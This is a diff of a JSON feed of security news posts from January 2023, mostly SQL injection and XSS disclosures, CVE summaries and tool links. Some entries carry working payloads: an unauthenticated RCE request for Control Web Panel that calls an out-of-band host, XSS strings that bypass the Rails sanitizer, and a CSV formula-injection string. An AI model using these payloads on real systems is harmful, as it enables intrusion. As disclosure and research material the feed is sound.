     "webpage_url": "https://packetstormsecurity.com/files/170532/infokart11-sql.txt"
 }
@@ -1118,7 +1066,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Yuvan Education CRM 3.0 SQL Injection\nhttps://packetstormsecurity.com/files/170548/yuvaneducationcrm30-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170548/yuvaneducationcrm30-sql.txt"
 }
@@ -1136,7 +1083,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Отзыв на курс «SQL-injection Master»\nhttps://codeby.net/threads/otzyv-na-kurs-sql-injection-master.81171/",
-    "urls": [],
     "webpage_description": "Всех приветствую!\n\nНастало время для очередного отзыва на курс «SQL-injection Master». Глубоко вдаваться не придётся, потому что есть отличные подробные отзывы от предыдущих участников (читать...",
     "webpage_url": "https://codeby.net/threads/otzyv-na-kurs-sql-injection-master.81171/"
 }
@@ -1198,7 +1144,7 @@
     "webpage_url": "https://telegra.ph/file/9317d6432415cc32a5959.jpg"
 }
 {
-    "date": "2023-01-15",
+    "date": "2023-01-16",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2023-0308 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository thorsten/phpmyfaq prior to 3.1.10.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
@@ -1323,7 +1269,6 @@
     "date": "2023-01-13",
     "from_channel": "defcon_news",
     "message": "WordPress Profile Builder 3.0.5 SQL Injection\nhttp://exploit.kitploit.com/2023/01/wordpress-profile-builder-305-sql.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/wordpress-profile-builder-305-sql.html"
 }
@@ -1331,15 +1276,13 @@
     "date": "2023-01-13",
     "from_channel": "defcon_news",
     "message": "WordPress Profile Builder 3.0.5 SQL Injection\nhttps://packetstormsecurity.com/files/170501/wpprofilebuilder305-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170501/wpprofilebuilder305-sql.txt"
 }
 {
     "date": "2023-01-13",
     "from_channel": "ctfchat",
-    "message": "Учишься такой на иб и за весь курс узнаешь что такое xss",
-    "urls": []
+    "message": "Учишься такой на иб и за весь курс узнаешь что такое xss"
 }
 {
     "date": "2023-01-13",
@@ -1430,7 +1373,6 @@
     "date": "2023-01-12",
     "from_channel": "defcon_news",
     "message": "ChiKoi 1.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/chikoi-10-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/chikoi-10-sql-injection.html"
 }
@@ -1438,7 +1380,6 @@
     "date": "2023-01-12",
     "from_channel": "defcon_news",
     "message": "ChiKoi 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/170484/chikoi10-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170484/chikoi10-sql.txt"
 }
@@ -1446,7 +1387,6 @@
     "date": "2023-01-12",
     "from_channel": "defcon_news",
     "message": "Online Food Ordering System 2.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/online-food-ordering-system-20-sql_12.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/online-food-ordering-system-20-sql_12.html"
 }
@@ -1454,15 +1394,13 @@
     "date": "2023-01-12",
     "from_channel": "defcon_news",
     "message": "Online Food Ordering System 2.0 SQL Injection\nhttps://packetstormsecurity.com/files/170469/ofos20-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170469/ofos20-sql.txt"
 }
 {
     "date": "2023-01-12",
     "from_channel": "defcon_news",
-    "message": "Alert: Hackers Actively Exploiting Critical \"Control Web Panel\" RCE Vulnerability\nhttps://thehackernews.com/2023/01/alert-hackers-actively-exploiting.html",
-    "urls": []
+    "message": "Alert: Hackers Actively Exploiting Critical \"Control Web Panel\" RCE Vulnerability\nhttps://thehackernews.com/2023/01/alert-hackers-actively-exploiting.html"
 }
 {
     "date": "2023-01-12",
@@ -1513,7 +1451,6 @@
     "date": "2023-01-11",
     "from_channel": "defcon_news",
     "message": "WordPress Royal Elementor 1.3.59 XSS / CSRF / Insufficient Access Controls\nhttp://exploit.kitploit.com/2023/01/wordpress-royal-elementor-1359-xss-csrf.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/wordpress-royal-elementor-1359-xss-csrf.html"
 }
@@ -1521,7 +1458,6 @@
     "date": "2023-01-11",
     "from_channel": "defcon_news",
     "message": "Concepts Informatics CMS 7 SQL Injection\nhttp://exploit.kitploit.com/2023/01/concepts-informatics-cms-7-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/concepts-informatics-cms-7-sql-injection.html"
 }
@@ -1529,7 +1465,6 @@
     "date": "2023-01-11",
     "from_channel": "defcon_news",
     "message": "WordPress Royal Elementor 1.3.59 XSS / CSRF / Insufficient Access Controls\nhttps://packetstormsecurity.com/files/170459/wproyalelemntor1359-insecure.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170459/wproyalelemntor1359-insecure.txt?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1537,7 +1472,6 @@
     "date": "2023-01-11",
     "from_channel": "defcon_news",
     "message": "Concepts Informatics CMS 7 SQL Injection\nhttps://packetstormsecurity.com/files/170437/cicms7-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170437/cicms7-sql.txt"
 }
@@ -1579,8 +1513,7 @@
 {
     "date": "2023-01-11",
     "from_channel": "defcon_news",
-    "message": "Microsoft Issues January 2023 Patch Tuesday Updates, Warns of Zero-Day Exploit\nhttps://thehackernews.com/2023/01/microsoft-issues-january-2023-patch.html",
-    "urls": []
+    "message": "Microsoft Issues January 2023 Patch Tuesday Updates, Warns of Zero-Day Exploit\nhttps://thehackernews.com/2023/01/microsoft-issues-january-2023-patch.html"
 }
 {
     "date": "2023-01-11",
@@ -1593,7 +1526,6 @@
     "date": "2023-01-11",
     "from_channel": "defcon_news",
     "message": "Cacti: Unauthenticated Remote Code Execution (CVE-2022-46169)\nhttps://www.reddit.com/r/netsec/comments/108pg3s/cacti_unauthenticated_remote_code_execution/",
-    "urls": [],
     "webpage_description": "Posted in the netsec community.",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/108pg3s/cacti_unauthenticated_remote_code_execution/"
 }
@@ -1726,7 +1658,6 @@
     "date": "2023-01-10",
     "from_channel": "defcon_news",
     "message": "Online Food Ordering System 2.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/online-food-ordering-system-20-sql.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/online-food-ordering-system-20-sql.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1734,7 +1665,6 @@
     "date": "2023-01-10",
     "from_channel": "defcon_news",
     "message": "Corpatech CMS 2 SQL Injection\nhttp://exploit.kitploit.com/2023/01/corpatech-cms-2-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/corpatech-cms-2-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1742,7 +1672,6 @@
     "date": "2023-01-10",
     "from_channel": "defcon_news",
     "message": "ADMINA BULGARIA Ltd 1.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/admina-bulgaria-ltd-10-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/admina-bulgaria-ltd-10-sql-injection.html"
 }
@@ -1750,7 +1679,6 @@
     "date": "2023-01-10",
     "from_channel": "defcon_news",
     "message": "Online Food Ordering System 2.0 SQL Injection\nhttps://packetstormsecurity.com/files/170418/ofoo2-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170418/ofoo2-sql.txt"
 }
@@ -1758,7 +1686,6 @@
     "date": "2023-01-10",
     "from_channel": "defcon_news",
     "message": "Corpatech CMS 2 SQL Injection\nhttps://packetstormsecurity.com/files/170407/corpatechcms2-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170407/corpatechcms2-sql.txt"
 }
@@ -1766,7 +1693,6 @@
     "date": "2023-01-10",
     "from_channel": "defcon_news",
     "message": "ADMINA BULGARIA Ltd 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/170404/adminabulgaria10-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170404/adminabulgaria10-sql.txt"
 }
@@ -1873,7 +1799,6 @@
     "date": "2023-01-09",
     "from_channel": "defcon_news",
     "message": "Eatself 1.1.5 SQL Injection\nhttp://exploit.kitploit.com/2023/01/eatself-115-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/eatself-115-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1881,7 +1806,6 @@
     "date": "2023-01-09",
     "from_channel": "defcon_news",
     "message": "Excel Net Computer Institute 4.1 SQL Injection\nhttp://exploit.kitploit.com/2023/01/excel-net-computer-institute-41-sql.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/excel-net-computer-institute-41-sql.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1889,7 +1813,6 @@
     "date": "2023-01-09",
     "from_channel": "defcon_news",
     "message": "Eatself 1.1.5 SQL Injection\nhttps://packetstormsecurity.com/files/170391/eatself115-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170391/eatself115-sql.txt"
 }
@@ -1897,7 +1820,6 @@
     "date": "2023-01-09",
     "from_channel": "defcon_news",
     "message": "Excel Net Computer Institute 4.1 SQL Injection\nhttps://packetstormsecurity.com/files/170390/enci41-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170390/enci41-sql.txt"
 }
@@ -1922,15 +1844,13 @@
     "date": "2023-01-08",
     "from_channel": "defcon_news",
     "message": "XSS Vulnerability Discovered In YITH WooCommerce Ajax Product Filter WordPress Plugin\nhttps://latesthackingnews.com/2020/06/25/xss-vulnerability-discovered-in-yith-woocommerce-ajax-product-filter-wordpress-plugin/",
-    "urls": [],
     "webpage_description": "One more WordPress plugin potentially risked the security of over 100,000 websites due to a security flaw. Reportedly, a serious cross-site scripting (XSS) vulnerability existed in the YITH WooCommerce Ajax Product Filter WordPress plugin. Exploiting",
     "webpage_url": "https://latesthackingnews.com/2020/06/25/xss-vulnerability-discovered-in-yith-woocommerce-ajax-product-filter-wordpress-plugin/?utm_source=dlvr.it&utm_medium=twitter"
 }
 {
     "date": "2023-01-08",
     "from_channel": "proxy_bar",
-    "message": "CVE-2022-44877\nControl Web Panel Unauth RCE\nPOC usage:\nPOST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: vuln\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&password=toor&commit=Login",
-    "urls": []
+    "message": "CVE-2022-44877\nControl Web Panel Unauth RCE\nPOC usage:\nPOST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: vuln\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&password=toor&commit=Login"
 }
 {
     "date": "2023-01-08",
@@ -1958,7 +1878,7 @@
     "message": "‼ CVE-2020-36648 ‼\n\nA vulnerability, which was classified as critical, was found in pouetnet pouet 2.0. This affects an unknown part. The manipulation of the argument howmany leads to sql injection. The name of the patch is 11d615931352066fb2f6dcb07428277c2cd99baf. It is recommended to apply a patch to fix this issue. The identifier VDB-217641 was assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-07",
+    "date": "2023-01-08",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2013-10009 ‼\n\nA vulnerability was found in DrAzraelTod pyChao and classified as critical. Affected by this issue is the function klauen/lesen of the file mod_fun/__init__.py. The manipulation leads to sql injection. The name of the patch is 9d8adbc07c384ba51c2583ce0819c9abb77dc648. It is recommended to apply a patch to fix this issue. VDB-217634 is the identifier assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
@@ -1983,12 +1903,12 @@
     "message": "‼ CVE-2020-36645 ‼\n\nA vulnerability, which was classified as critical, was found in square squalor. This affects an unknown part. The manipulation leads to sql injection. Upgrading to version v0.0.0 is able to address this issue. The name of the patch is f6f0a47cc344711042eb0970cb423e6950ba3f93. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217623.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-07",
+    "date": "2023-01-08",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2016-15013 ‼\n\nA vulnerability was found in ForumHulp searchresults. It has been rated as critical. Affected by this issue is the function list_keywords of the file event/listener.php. The manipulation of the argument word leads to sql injection. The name of the patch is dd8a312bb285ad9735a8e1da58e9e955837b7322. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-217628.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-07",
+    "date": "2023-01-08",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2014-125064 ‼\n\nA vulnerability, which was classified as critical, has been found in elgs gosqljson. This issue affects the function QueryDbToArray/QueryDbToMap/ExecDb of the file gosqljson.go. The manipulation of the argument sqlStatement leads to sql injection. The name of the patch is 2740b331546cb88eb61771df4c07d389e9f0363a. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-217631.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
@@ -1998,7 +1918,7 @@
     "message": "‼ CVE-2018-25069 ‼\n\nA vulnerability classified as critical has been found in Netis Netcore Router. This affects an unknown part. The manipulation leads to use of hard-coded password. It is possible to initiate the attack remotely. The identifier VDB-217593 was assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-07",
+    "date": "2023-01-08",
     "from_channel": "hackgit",
     "message": "TLS Poison\n\nA tool that allows for generic SSRF via TLS, as well as CSRF via image tags in most browsers. The goals are similar to SNI injection, but this new method uses inherent behaviors of TLS, instead of depending upon bugs in a particular implementation.\n\nhttps://github.com/jmdx/TLS-poison",
     "webpage_description": "Lots of people try to attack the security of TLS. But what if we use TLS to attack other things? It's a huge standard, and it turns out that features intended to make TLS fast have also made it useful as an attack vector.\n\nAmong other things, these features provide a lot of flexibility for Server-Side Request Forgery (SSRF). While past work using HTTPS URLs in SSRF has relied upon platform-specific bugs such as SNI injection, we can go further. In this talk, I present a novel, cross-platform way of leveraging TLS to target internal services.\n\nUniquely, these attacks are more effective the more comprehensively a platform supports modern TLS, so won't go away with library upgrades. It is also unlikely that the TLS spec will change overnight at the whim of a random security researcher. Instead, we need to walk through scenarios and dispel common assumptions so the audience can know what to look out for. Of course, the best way to do so is with demos!",
@@ -2073,7 +1993,6 @@
     "date": "2023-01-06",
     "from_channel": "defcon_news",
     "message": "U.S. Dept Of Defense: xss on reset password page\nhttps://vulners.com/hackerone/H1:1763404?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "target:https:// █████/Default.aspx?TabId=81&ctl=SendPassword&returnurl=%252fUOTSHelpDesk When a user goes on the forget password page and enters a username it is reflected onto the page. An attacker could simply enter a username like alert(1) and it would execute an alert not to mention there is no csrf protection allowing a attacker to possibly chain csrf with this and cause alot of harm. references: https://owncloud.com/security-advisories/reflected-xss-in-login-page-forgot-password-functionallity/ https://hackerone.com/reports/125059 Impact an attacker could steal cookies from a user social engineer them or redirect them System Host(s)  ███ Affected Product(s) and Version(s) CVE Numbers Steps to Reproduce go to https:// ████/Default.aspx?TabId=81&ctl=SendPassword&returnurl=%252fUOTSHelpDesk enter a payload in username field Suggested Mitigation/Remediation Actions put a character limit and sanitize user...",
     "webpage_url": "https://vulners.com/hackerone/H1:1763404?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
@@ -2081,7 +2000,6 @@
     "date": "2023-01-06",
     "from_channel": "defcon_news",
     "message": "U.S. Dept Of Defense: XSS via Client Side Template Injection on www.███/News/Speeches\nhttps://vulners.com/hackerone/H1:1736317?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "Dear DoD - Team, I am able to execute javascript code on www. ███████/News/Speeches. This endpoint has a search functionality with the parameter Search. The supplied value to this parameter gets embedded into the website. Furthermore the frontend of the website is presumably created with a template engine. These engines handle user supplied data within double curly braces {{...}} for example. If the user input is not sanitized corretly template injection can occur. When supplying the Search parameter with a value inside double curly braces it gets evaluated and the result is then embedded into the web page. For example the search value www. ███████/News/Speeches?Search={{7*7}} gets evaluated to 49 and put into the web page (see image_1.png). Besides simple mathematical equations, javascript code can be put inside those braces too (see image_2.png). This will execute the code as well which results in a XSS vulnerability. There are some mitigations to this. For example some methods are blacklisted which means alert(1)…",
     "webpage_url": "https://vulners.com/hackerone/H1:1736317?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
@@ -2124,7 +2042,6 @@
     "date": "2023-01-06",
     "from_channel": "sysadm_in_channel",
     "message": "/ SQL Injection vulnerability (CVE-2022-47523) was discovered in Password Manager Pro, PAM360 and Access Manager Plus\n\nhttps://www.manageengine.com/privileged-session-management/advisory/cve-2022-47523.html",
-    "urls": [],
     "webpage_description": "SQL Injection Vulnerability in ManageEngine Access Manager Plus",
     "webpage_url": "https://www.manageengine.com/privileged-session-management/advisory/cve-2022-47523.html"
 }
@@ -2174,7 +2091,6 @@
     "date": "2023-01-05",
     "from_channel": "defcon_news",
     "message": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877\nhttps://www.reddit.com/r/netsec/comments/10454f0/centos_web_panel_7_unauthenticated_remote_code/",
-    "urls": [],
     "webpage_description": "28 votes and 1 comment so far on Reddit",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/10454f0/centos_web_panel_7_unauthenticated_remote_code/"
 }
@@ -2224,7 +2140,7 @@
     "message": "‼ CVE-2022-43526 ‼\n\nMultiple vulnerabilities within the web-based management interface of Aruba EdgeConnect Enterprise Orchestrator could allow a remote attacker to conduct a reflected cross-site scripting (XSS) attack against a user of the interface. A successful exploit could allow an attacker to execute arbitrary script code in a victim's browser in the context of the affected interface in Aruba EdgeConnect Enterprise Orchestration Software version(s): Aruba EdgeConnect Enterprise Orchestrator (on-premises), Aruba EdgeConnect Enterprise Orchestrator-as-a-Service, Aruba EdgeConnect Enterprise Orchestrator-SP and Aruba EdgeConnect Enterprise Orchestrator Global Enterprise Tenant Orchestrators - Orchestrator 9.2.1.40179 and below, - Orchestrator 9.1.4.40436 and below, - Orchestrator 9.0.7.40110 and below, - Orchestrator 8.10.23.40015 and below, - Any older branches of Orchestrator not specifically mentioned.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-05",
+    "date": "2023-01-11",
     "from_channel": "hackgit",
     "message": "​​XSSFire\n\nA standalone Blind XSS Script.\n\nhttps://github.com/SeifElsallamy/XSSFire",
     "webpage_url": "https://telegra.ph/file/e9b7a3545046fb381b56f.jpg"
@@ -2233,7 +2149,6 @@
     "date": "2023-01-04",
     "from_channel": "defcon_news",
     "message": "Internet Bug Bounty: CVE-2022-23519: Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)\nhttps://vulners.com/hackerone/H1:1805899?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "The following is from: https://hackerone.com/reports/1656627 Intro The Rails HTML sanitzier allows to set certain combinations of tags in it's allow list that are not properly handled.  Similar to the report 1530898, which identified the combinationselect and style as vulnerable, my fuzz testing from today suggests that also svg and style as well as math and style allow XSS. The following are PoCs for each of these allow list: - svg and style: <svg><style><script>alert(1)</script></style></svg> - math and style: <math><style><img src=x onerror=alert(1)></style></math> See the following IRB session:  irb(main):016:0> require 'rails-html-sanitizer' => false irb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<svg><style><script>alert(1)</script></style></svg>\", tags: [\"svg\", \"style\"]).to_s => \"<svg><style><script>alert(1)</script></style></svg>\" irb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<math><style><img src=x onerror=alert(1)></style></math>\", tags: [\"math\", \"style\"]).to_s => \"<math><style><img…",
     "webpage_url": "https://vulners.com/hackerone/H1:1805899?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
@@ -2241,7 +2156,6 @@
     "date": "2023-01-04",
     "from_channel": "defcon_news",
     "message": "Internet Bug Bounty:  CVE-2022-23520: Incomplete fix for CVE-2022-32209 (XSS in Rails::Html::Sanitizer under certain configurations)\nhttps://vulners.com/hackerone/H1:1805893?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "The following is from: https://hackerone.com/reports/1654310 While building a PoC for CVE-2022-32209, I noticed that I could not fix my vulnerable application by updating https://github.com/rails/rails-html-sanitizer from 1.4.2 to 1.4.3 even though the Hackerone report about this vulnerability suggested that this should fix it (see here: https://hackerone.com/reports/1530898). I built this app with Rails 7.0.3.1 by just running \"rails new\", adding config.action_view.sanitized_allowed_tags = [\"select\", \"style\"] to the file config/application.rb and creating an endpoint that reflected a parameter after sanitizing it (ERB: <p>Hello <%= sanitize @name %></p>). When using the payload <select><style><script>alert(\"XSS\")</script></style></select> for the parameter I got an alert no matter what the version of rails-html-sanitizer was. I believe the reason is the following. There are two ways you can pass the list of allowed tags to the sanitizer. One is via a list of tags stored in a class attribute, the other is via…",
     "webpage_url": "https://vulners.com/hackerone/H1:1805893?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
@@ -2284,15 +2198,13 @@
     "date": "2023-01-04",
     "from_channel": "defcon_news",
     "message": "Consensys: CSV Injection at https://assets-paris-demo.codefi.network/\nhttps://vulners.com/hackerone/H1:1748961?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "Summary: Hi consensys Security Team. I have found CSV Injection when generate report at https://assets-paris-demo.codefi.network/ CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files. When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with = will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks: - Hijacking the user’s computer by exploiting vulnerabilities in the spreadsheet software, such as CVE-2014-3524. - Hijacking the user’s computer by exploiting the user’s tendency to ignore security warnings in spreadsheets that they downloaded from their own website. - Exfiltrating contents from the spreadsheet, or other open spreadsheets.  Steps To Reproduce:  Create an account at https://assets-paris-demo.codefi.network/  Go to Client management Create new client  At Client name* Put this paylaod:- =cmd|' /C notepad'!'A1' After create new client…",
     "webpage_url": "https://vulners.com/hackerone/H1:1748961?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
 {
     "date": "2023-01-04",
     "from_channel": "defcon_news",
-    "message": "Synology Releases Patch for Critical RCE Vulnerability Affecting VPN Plus Servers\nhttps://thehackernews.com/2023/01/synology-releases-patch-for-critical.html",
-    "urls": []
+    "message": "Synology Releases Patch for Critical RCE Vulnerability Affecting VPN Plus Servers\nhttps://thehackernews.com/2023/01/synology-releases-patch-for-critical.html"
 }
 {
     "date": "2023-01-03",
@@ -2330,7 +2242,6 @@
     "date": "2023-01-03",
     "from_channel": "defcon_news",
     "message": "SQLMAP - Automatic SQL Injection Tool 1.7\nhttp://exploit.kitploit.com/2023/01/sqlmap-automatic-sql-injection-tool-17.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/sqlmap-automatic-sql-injection-tool-17.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -2344,7 +2255,6 @@
     "date": "2023-01-03",
     "from_channel": "defcon_news",
     "message": "SSRF vulnerabilities caused by SNI proxy misconfigurations\nhttps://www.reddit.com/r/netsec/comments/1028g0j/ssrf_vulnerabilities_caused_by_sni_proxy/",
-    "urls": [],
     "webpage_description": "Posted in r/netsec by u/Gallus • 1 point and 0 comments",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/1028g0j/ssrf_vulnerabilities_caused_by_sni_proxy/"
 }
@@ -2419,22 +2329,22 @@
     "message": "‼ CVE-2022-4140 ‼\n\nThe Welcart e-Commerce WordPress plugin before 2.8.5 does not validate user input before using it to output the content of a file, which could allow unauthenticated attacker to read arbitrary files on the server\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-02",
+    "date": "2023-01-04",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2022-4372 ‼\n\nThe Web Invoice WordPress plugin through 2.1.3 does not properly sanitize and escape a parameter before using it in a SQL statement, leading to a SQL Injection exploitable by high privilege users such as admin by default. However, depending on the plugin configuration, other users, such as subscriber could exploit this as well\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-02",
+    "date": "2023-01-04",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2022-3860 ‼\n\nThe Visual Email Designer for WooCommerce WordPress plugin before 1.7.2 does not properly sanitise and escape a parameter before using it in a SQL statement, leading to a SQL injection exploitable by users with a role as low as author.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-02",
+    "date": "2023-01-04",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2022-3241 ‼\n\nThe Build App Online WordPress plugin before 1.0.19 does not properly sanitise and escape some parameters before using them in a SQL statement via an AJAX action available to unauthenticated users, leading to a SQL injection\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-02",
+    "date": "2023-01-04",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2022-4360 ‼\n\nThe WP RSS By Publishers WordPress plugin through 0.1 does not properly sanitize and escape a parameter before using it in a SQL statement, leading to a SQL injection exploitable by high privilege users such as admin\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
@@ -2462,7 +2372,6 @@
     "date": "2023-01-02",
     "from_channel": "defcon_news",
     "message": "BDWeb-Link LMS 1.11.5 SQL Injection\nhttp://exploit.kitploit.com/2023/01/bdweb-link-lms-1115-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/bdweb-link-lms-1115-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -2470,7 +2379,6 @@
     "date": "2023-01-02",
     "from_channel": "defcon_news",
     "message": "BDWeb-Link LMS 1.11.5 SQL Injection\nhttps://packetstormsecurity.com/files/170347/bdweblink1115-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170347/bdweblink1115-sql.txt"
 }
@@ -2495,7 +2403,6 @@
     "date": "2023-01-01",
     "from_channel": "defcon_news",
     "message": "Serious XSS Vulnerability Found In Zoom Whiteboard\nhttps://latesthackingnews.com/2023/01/01/serious-xss-vulnerability-found-in-zoom-whiteboard/",
-    "urls": [],
